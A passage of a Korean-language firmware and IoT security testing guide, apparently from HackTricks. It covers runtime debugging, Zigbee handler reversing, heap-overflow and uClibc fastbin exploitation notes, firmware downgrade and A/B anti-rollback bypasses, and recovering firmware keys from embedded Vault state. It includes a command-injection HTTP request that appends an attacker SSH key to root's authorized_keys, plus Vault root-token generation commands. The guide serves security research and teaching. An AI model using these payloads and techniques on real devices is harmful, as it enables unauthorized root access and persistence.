반복 가능한 fault isolation을 위해 안정적으로 쓸 수 있는 볼륨에 타임스탬프가 포함된 marker 파일을 기록하고 오프라인에서 검증하세요. `/dev/kmsg`, FIFO, 일시적인 콘솔은 rate limiting이나 프로세스의 조기 종료로 인해 false negative를 발생시킬 수 있습니다. 또한 관련 없는 코드를 변경하기 전에 각 계층의 인터페이스가 정확히 일치하는지 비교하세요. `uname -r`과 `/lib/modules/`, 디스크상의 ext4 기능과 커널 설정, Mesa `libGL` 세대와 DRI driver ABI 및 PCI에서 파생된 driver 이름을 비교하면 됩니다. 구성 요소가 존재하고 `dlopen()`이 성공하더라도, 이를 사용하는 쪽에서 다른 ABI를 기대하면 사용할 수 없습니다.<sup>[[11]](#references)</sup>

## 실전 동적 분석

이 단계에서는 실제 또는 에뮬레이트된 기기 환경을 사용해 분석합니다. OS와 파일 시스템에 대한 셸 접근을 유지하는 것이 중요합니다. 에뮬레이션이 하드웨어 상호작용을 완벽하게 모방하지 못할 수 있으므로, 에뮬레이션을 가끔 재시작해야 할 수 있습니다. 파일 시스템을 다시 살펴보고, 노출된 웹페이지와 네트워크 서비스를 exploit하며, 부트로더 취약점을 탐색해야 합니다. 잠재적인 backdoor 취약점을 식별하려면 펌웨어 무결성 테스트가 중요합니다.

## 런타임 분석 기법

런타임 분석은 운영 환경에서 프로세스나 바이너리와 상호작용하는 작업입니다. gdb-multiarch, Frida, Ghidra 같은 도구를 사용해 중단점을 설정하고, fuzzing 및 기타 기법으로 취약점을 식별합니다.

전체 디버거를 사용할 수 없는 임베디드 대상에서는 **정적으로 링크된 `gdbserver`를 기기에 복사**한 뒤 원격으로 연결하세요:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Zigbee / radio-co-processor 메시지 매핑

IoT 허브에서는 RF 스택이 **radio MCU**와 Linux 사용자 공간 프로세스 사이에 분리되어 있는 경우가 많습니다. 유용한 작업 흐름은 경로를 매핑하는 것입니다:<sup>[[8]](#references)</sup>

1. 무선상의 **RF frame**
2. radio MCU의 **controller-side parser**
3. Linux로 전달되는 **serial/UART text 또는 TLV protocol**(예: `/dev/tty*`)
4. 메인 데몬의 **application dispatcher**
5. **protocol-specific handler / state machine**

이 아키텍처에서는 하나가 아니라 두 가지 리버싱 대상이 생깁니다. 컨트롤러가 바이너리 무선 프레임을 `Group,Command,arg1,arg2,...` 같은 텍스트 프로토콜로 변환한다면 다음을 파악합니다.

- **message group** 및 dispatch table
- 어떤 메시지가 **network**에서 올 수 있고 어떤 메시지가 컨트롤러 자체에서 올 수 있는지
- 정확한 **manufacturer-specific discriminator field**(예: Zigbee의 `manufacturer_code`와 사용자 지정 `cluster_command`)
- **commissioning**, discovery 또는 firmware/model download 단계에서만 도달 가능한 handler

특히 Zigbee의 경우 pairing 트래픽을 캡처하고 대상 장치가 기본 **Link Key** `ZigBeeAlliance09`에 여전히 의존하는지 확인합니다. 그렇다면 commissioning 트래픽을 스니핑해 **Network Key**를 노출할 수 있습니다. Zigbee 3.0 install code는 이러한 노출을 줄이므로, 테스트한 장치가 실제로 이를 강제하는지 기록합니다.

### Manufacturer-specific protocol handler와 FSM으로 제한되는 도달 가능성

Vendor-specific Zigbee/ZCL 명령은 검증이 충분히 이루어지지 않은 **custom parsing code**와 내부 **FSM**으로 이어지기 때문에 표준 cluster보다 더 좋은 대상인 경우가 많습니다.<sup>[[8]](#references)</sup>

실무 작업 흐름:

- **vendor-only handler**를 찾을 때까지 command dispatcher를 리버스합니다.
- **FSM state**, **event**, **check**, **action**, **next-state** table을 파악합니다.
- 자동으로 다음 상태로 넘어가는 **transitional state**와, 결국 공격자가 제어하는 상태를 초기화하거나 해제하는 retry/error 분기를 식별합니다.
- 버그가 있는 handler가 항상 도달 가능하다고 가정하지 말고, 데몬을 취약한 상태로 만들기 위해 필요한 정상적인 protocol exchange를 확인합니다.

타이밍에 민감한 프로토콜에서는 Python framework를 통한 packet replay가 너무 느릴 수 있습니다. 더 신뢰할 수 있는 방법은 vendor-grade stack이 있는 실제 하드웨어(예: **nRF52840**)에서 정상 장치를 에뮬레이션하여 올바른 **endpoint**, **attribute**, commissioning 타이밍을 구현하는 것입니다.

### 임베디드 데몬의 fragmented-download 버그 유형

**fragmented blob/model/configuration download**에서 반복적으로 나타나는 firmware 버그 유형입니다:<sup>[[8]](#references)</sup>

1. **첫 번째 fragment**(`offset == 0`)가 `ctx->total_size`를 저장하고 `malloc(total_size)`를 할당합니다.
2. 이후 fragment는 `packet_total_size >= offset + chunk_len` 같은 공격자가 제어하는 **packet-local** 필드만 검증합니다.
3. 복사 작업은 **원래 할당된 크기**를 확인하지 않고 `memcpy(&ctx->buffer[offset], chunk, chunk_len)`을 호출합니다.

공격자는 다음과 같이 할 수 있습니다.

- **작은** 선언된 전체 크기를 사용하는 유효한 첫 번째 fragment를 보내 작은 heap allocation을 유도합니다.
- **예상 offset**은 유지하면서 더 큰 `chunk_len`을 사용하는 후속 fragment를 보냅니다.
- 새 검증을 통과하면서도 원래 할당된 buffer를 넘치게 하는 위조된 packet-local 크기를 보냅니다.

취약한 경로가 commissioning 로직 뒤에 있다면, 잘못된 fragment를 보내기 전에 대상 장치를 예상되는 model-download 또는 blob-download 상태로 만들 수 있도록 충분한 **device emulation**을 포함해야 합니다.

### Protocol로 유발하는 `free()` 트리거

임베디드 데몬에서 heap metadata exploitation을 유발하는 가장 쉬운 방법은 "cleanup을 기다리는 것"이 아니라 **프로토콜 자체의 오류 처리를 강제하는 것**인 경우가 많습니다.<sup>[[8]](#references)</sup>

- 잘못된 후속 fragment를 보내 FSM을 **retry** 또는 **error** 상태로 이동시킵니다.
- retry 한도를 넘겨 데몬이 **context를 초기화**하고 손상된 buffer를 해제하게 합니다.
- 이 예측 가능한 `free()`를 사용해 관련 없는 이유로 프로세스가 중단되기 전에 allocator 측 primitive를 유발합니다.

이는 특히 임베디드 Linux의 **musl/uClibc/dlmalloc 계열** allocator를 대상으로 할 때 유용합니다. chunk metadata를 손상시키면 unlink/unbin 로직을 write primitive로 바꿀 수 있습니다. 안정적인 방법은 실제 bin pointer를 바로 덮어써 프로세스를 중단시키는 대신, **size field**를 손상시켜 allocator traversal이 overflow된 buffer 안에 배치한 **fake chunk**를 따라가도록 하는 것입니다.

## Binary Exploitation and Proof-of-Concept

식별된 취약점의 PoC를 개발하려면 대상 아키텍처를 깊이 이해하고 하위 수준 언어로 프로그래밍해야 합니다. 임베디드 시스템에서는 바이너리 런타임 보호 기능이 드물지만, 존재하는 경우 Return Oriented Programming (ROP) 같은 기법이 필요할 수 있습니다.

### uClibc fastbin exploitation 참고 사항 (embedded Linux)

- **Fastbin과 consolidation:** uClibc는 glibc와 유사한 fastbin을 사용합니다. 이후의 큰 allocation이 `__malloc_consolidate()`를 트리거할 수 있으므로, fake chunk는 검증을 통과해야 합니다(정상적인 size, `fd = 0`, 주변 chunk가 "in use"로 인식됨).<sup>[[6]](#references)</sup>
- **ASLR이 적용된 non-PIE binary:** ASLR이 활성화되어 있어도 메인 binary가 **non-PIE**라면, binary 내부의 `.data/.bss` 주소는 고정되어 있습니다. 이미 유효한 heap chunk header와 비슷한 영역을 대상으로 하여 fastbin allocation이 **function pointer table**에 위치하도록 할 수 있습니다.
- **Parser를 중단시키는 NUL:** JSON을 파싱할 때 payload의 `\x00`은 파싱을 중단시키면서 후속 공격자 제어 바이트는 stack pivot/ROP chain에 사용할 수 있도록 남겨둘 수 있습니다.
- **`/proc/self/mem`을 통한 shellcode:** `open("/proc/self/mem")`, `lseek()`, `write()`를 호출하는 ROP chain으로 알려진 mapping에 실행 가능한 shellcode를 심고 해당 위치로 jump할 수 있습니다.

## Firmware Analysis용 운영 체제 준비

[AttifyOS](https://github.com/adi0x90/attifyos)와 [EmbedOS](https://github.com/scriptingxss/EmbedOS) 같은 운영 체제는 firmware security testing에 필요한 도구를 갖춘 사전 구성 환경을 제공합니다.

## Firmware 분석용 사전 준비 OS

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS는 Internet of Things (IoT) 장치의 보안 평가와 penetration testing을 지원하도록 설계된 배포판입니다. 필요한 모든 도구가 로드된 사전 구성 환경을 제공하여 많은 시간을 절약해 줍니다.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): firmware security testing 도구가 사전 설치된 Ubuntu 18.04 기반 임베디드 보안 테스트 운영 체제입니다.

## Firmware Downgrade Attacks & Insecure Update Mechanisms

벤더가 firmware image의 cryptographic signature 검사를 구현하더라도 **version rollback (downgrade) protection**은 자주 누락됩니다. boot 또는 recovery loader가 내장된 public key로 signature만 확인하고 플래시할 image의 *version*(또는 monotonic counter)은 비교하지 않는다면, 공격자는 유효한 signature가 그대로 있는 **더 오래되고 취약한 firmware**를 정상적으로 설치하여 이미 패치된 취약점을 다시 노출시킬 수 있습니다.<sup>[[4]](#references)</sup>

일반적인 공격 작업 흐름:

1. **이전 버전의 서명된 image를 확보합니다.**
   * 벤더의 공개 download portal, CDN 또는 지원 사이트에서 가져옵니다.
   * 동반 모바일/데스크톱 애플리케이션에서 추출합니다(예: Android APK의 `assets/firmware/`).
   * VirusTotal, Internet archive, forum 등의 제3자 저장소에서 가져옵니다.
2. 노출된 update channel을 통해 장치에 image를 업로드하거나 제공합니다.
   * Web UI, mobile-app API, USB, TFTP, MQTT 등
   * 많은 소비자 IoT 장치는 인증되지 않은 HTTP(S) endpoint를 노출하며, 이 endpoint는 Base64로 인코딩된 firmware blob을 받아 서버 측에서 디코딩한 뒤 recovery/upgrade를 시작합니다.
3. downgrade 후에는 최신 버전에서 패치된 취약점을 악용합니다(예: 나중에 추가된 command-injection filter).
4. 선택적으로 persistence를 확보한 뒤 탐지를 피하기 위해 최신 image를 다시 플래시하거나 update를 비활성화합니다.

### 예: Downgrade 후 Command Injection

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

취약한(다운그레이드된) 펌웨어에서는 `md5` 매개변수가 정화 과정 없이 셸 명령에 직접 연결되어 임의의 명령을 삽입할 수 있습니다(여기서는 SSH 키 기반 root access를 활성화함). 이후 펌웨어 버전에서는 기본적인 문자 필터를 도입했지만, 다운그레이드 방지 기능이 없어 이 수정은 무의미합니다.<sup>[[4]](#references)</sup>

### 모바일 앱에서 펌웨어 추출하기

많은 공급업체는 앱이 Bluetooth/Wi-Fi를 통해 기기를 업데이트할 수 있도록 전체 펌웨어 이미지를 함께 제공되는 모바일 애플리케이션에 번들로 포함합니다. 이러한 패키지는 일반적으로 `assets/fw/` 또는 `res/raw/` 같은 경로에 있는 APK/APEX 내부에 암호화되지 않은 상태로 저장됩니다. `apktool`, `ghidra` 또는 일반 `unzip` 같은 도구를 사용하면 물리적 하드웨어에 접근하지 않고도 서명된 이미지를 추출할 수 있습니다.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### A/B slot 설계에서 updater 전용 anti-rollback 우회

일부 vendor는 anti-downgrade **ratchet**을 구현하지만, *updater* 로직 내부에만 적용합니다(예: CAN을 통한 UDS routine, recovery command 또는 userspace OTA agent). 이후 **bootloader**가 이미지 signature/CRC만 확인하고 partition table 또는 slot metadata를 신뢰한다면, rollback protection은 여전히 우회될 수 있습니다.<sup>[[7]](#references)</sup>

일반적인 취약 설계:

- Firmware metadata에 version descriptor와 **security ratchet** / monotonic counter가 모두 들어 있습니다.
- Updater는 이미지 ratchet을 persistent storage에 저장된 값과 비교해, 더 오래된 signed image를 거부합니다.
- Bootloader는 해당 ratchet을 **파싱하지 않고**, 선택된 slot을 부팅하기 전에 header, CRC, signature만 확인합니다.
- Slot 활성화 정보는 partition table 또는 slot별 generation counter에 별도로 저장되며, 검증된 정확한 firmware digest와 **암호학적으로 결합되어 있지 않습니다**.

이로 인해 dual-slot 시스템에서 **이미지 하나를 검증하고 다른 이미지를 부팅하는** primitive가 만들어집니다. 공격자가 현재 signed image를 사용해 updater가 slot B를 다음 부팅 대상으로 표시하게 만든 뒤, 재부팅 전에 slot B를 덮어쓸 수 있다면, bootloader는 이미 커밋된 slot metadata만 신뢰하므로 downgraded image를 부팅할 수 있습니다.

흔히 악용되는 패턴:

1. **현재 signed** firmware를 passive slot에 업로드하고, 일반적인 검증/전환 routine을 실행해 해당 slot이 다음 활성 slot이 되도록 layout을 설정합니다.
2. **아직 재부팅하지 않습니다**. 같은 session에서 slot 준비/erase routine을 다시 실행합니다.
3. 오래된 boot-state 또는 slot-selection 로직을 악용해 updater가 방금 승격한 **동일한 물리 slot**을 지우게 합니다.
4. 더 오래되었지만 여전히 signed된 firmware를 해당 slot에 씁니다.
5. ratchet을 적용하는 검증 routine을 건너뛰고 바로 재부팅합니다.
6. Bootloader가 승격된 slot을 선택하고 signature/integrity만 확인한 뒤, 오래된 이미지를 부팅합니다.

A/B update 구현을 분석할 때 살펴볼 항목:

- 성공적인 전환 후에도 갱신되지 않는 **부팅 시점 플래그**에서 slot selection을 도출하는지 여부.
- **현재 커밋된 layout**이 아닌 오래된 상태를 바탕으로 slot을 지우는 `prepare_passive_slot()` 유형의 routine이 있는지 여부.
- 검증된 image hash를 저장하지 않고 **generation counter** / active flag만 갱신하는 `part_write_layout()` 유형의 function이 있는지 여부.
- Ratchet 검사가 userspace 또는 updater code에만 구현되고 ROM / bootloader / secure boot 단계에는 없는지 여부.
- Erase 또는 recovery routine이 slot의 내용을 지우고 다시 쓴 뒤에도 해당 slot을 bootable 상태로 남기는지 여부.

### Update 로직 평가 체크리스트

* *Update endpoint*의 transport/authentication이 적절히 보호되는가(TLS + authentication)?
* Flashing 전에 device가 **version number** 또는 **monotonic anti-rollback counter**를 비교하는가?
* Image가 secure boot chain 내부에서 검증되는가(예: ROM code가 signature를 확인하는가)?
* **Bootloader가 signature/CRC만 확인하는 대신 updater와 동일한 ratchet을 적용하는가?**
* Slot 활성화 metadata가 **검증된 firmware digest/version과 결합되어 있는가**, 아니면 승격 후에도 slot을 수정할 수 있는가?
* Slot 전환 성공 후 device가 강제로 재부팅되는가, 아니면 같은 session에서 이후 update/erase routine에 계속 접근할 수 있는가?
* Userland code가 추가적인 sanity check(예: 허용된 partition map, model number)를 수행하는가?
* *부분* 또는 *백업* update flow가 동일한 검증 로직을 재사용하는가?

> 💡  위 항목 중 누락된 것이 있다면, 해당 platform은 rollback attack에 취약할 가능성이 높습니다.

## 실습용 취약 firmware

Firmware의 취약점을 찾는 연습을 하려면, 다음 취약 firmware project를 출발점으로 사용하세요.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## embedded KMS/Vault state에서 firmware 복호화 키 복구하기

Update image에 작은 plaintext metadata와 크고 entropy가 높은 blob이 함께 들어 있다면, 무차별 대입을 하기 전에 container를 먼저 분류하세요:<sup>[[1]](#references)</sup>

- `hexdump`, `xxd`, `strings -tx`, `base64 -d`, `binwalk -E`를 사용해 header, offset, 줄 경계를 덤프합니다.
- `Salted__`는 대개 OpenSSL `enc` format을 의미합니다. 다음 8바이트는 salt이며 나머지는 ciphertext입니다.
- 디코딩 결과가 정확히 `256`바이트인 Base64 field는 무작위 firmware password/session key를 감싼 RSA-2048 ciphertext일 가능성이 높다는 강한 단서입니다.
- 같은 파일의 detached PGP 자료는 authenticity만 보호하는 경우가 많습니다. 이를 confidentiality mechanism이라고 단정하지 마세요.

정적 키 탐색(`grep`, `strings`, PEM/PGP 검색)이 실패하면 private key만 찾는 대신 **실제 복호화 경로**를 역분석하세요.

- Updater / management binary를 decompile하고, 누가 encrypted blob을 읽는지, 어떤 helper/API가 이를 unwrap하는지, 어떤 논리적 key name을 요청하는지 추적합니다.
- 추출한 root filesystem에서 KMS state(`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`)와 unit file 및 init script를 검색합니다.
- Plaintext `vault operator unseal ...`, recovery key, bootstrap token 또는 로컬 KMS auto-unseal script는 private-key 자료와 동일하게 취급합니다.

Appliance에 원본 Vault binary와 storage backend가 포함되어 있다면, Vault 내부를 다시 구현하는 것보다 해당 환경을 재현하는 편이 대개 더 쉽습니다:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

복제한 KMS에서 root 권한을 확보한 상태에서:

- transit 키를 격리된 복제본에서만 내보낼 수 있도록 설정합니다: `vault write transit/keys/<name>/config exportable=true`
- unwrap 키를 내보냅니다: `vault read transit/export/encryption-key/<name>`
- 복구한 RSA 키로 KMS에서 사용한 것과 정확히 같은 패딩/해시 조합을 시도합니다. PKCS#1 v1.5 복호화와 기본 OAEP 복호화가 실패했다고 해서 키가 틀렸다는 뜻은 **아닙니다**. Vault 기반 흐름의 상당수는 OAEP와 SHA-256을 사용하지만, 일반적인 라이브러리는 기본값으로 SHA-1을 사용합니다.
- 페이로드가 `Salted__`로 시작한다면, AES-CBC 복호화를 시도하기 전에 공급업체의 OpenSSL KDF(`EVP_BytesToKey`, 레거시 장비에서는 MD5를 사용하는 경우가 많음)를 정확히 재현합니다.

이렇게 하면 "암호화된 펌웨어" 문제를 더 일반적인 문제로 바꿀 수 있습니다. **장비 측 운영 키를 복구한 다음, 정확한 unwrap 및 KDF 매개변수를 오프라인에서 재현합니다.**

## 교육 및 자격증

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Claude로 펌웨어 크래킹하기: 시니어 수준의 기술, 주니어 수준의 자율성](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [펌웨어 보안 테스트 방법론](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [실전 IoT 해킹: 사물 인터넷 공격을 위한 완벽 가이드](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [버려진 하드웨어의 제로데이 취약점 악용 – Trail of Bits 블로그](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [20달러짜리 스마트 기기로 집에 접근한 방법](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [이제 mi를 볼 수 있습니다: 이제 당신은 Pwned되었습니다](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - 충전 포트 커넥터를 통해 Tesla Wall Connector 악용하기 - 2부: 다운그레이드 방지 우회](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [깜빡이게 만들기: Philips Hue Bridge의 무선 업데이트를 통한 악용](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [QEMU에서 Tesla OS ROOT 하기 1부: 압축 풀기](https://cn0xroot.wordpress.com/2026/09/19/root-tesla-os-on-qemu-part-1-unpacking)
- [10] [Linux 커널 문서 - dm-linear](https://docs.kernel.org/admin-guide/device-mapper/linear.html)
- [11] [QEMU에서 Tesla OS ROOT 하기 2부: 디버깅 및 수정](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
- [12] [Dell BIOS 비밀번호: 취약한 XOR 암호화를 통해 SPI 플래시에서 복구 가능 (CVE-2026-40639)](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
- [13] [R3n5k1/dellpwn - Dell BIOS 비밀번호 복구 도구](https://github.com/R3n5k1/dellpwn)
{{#include ../../banners/hacktricks-training.md}}
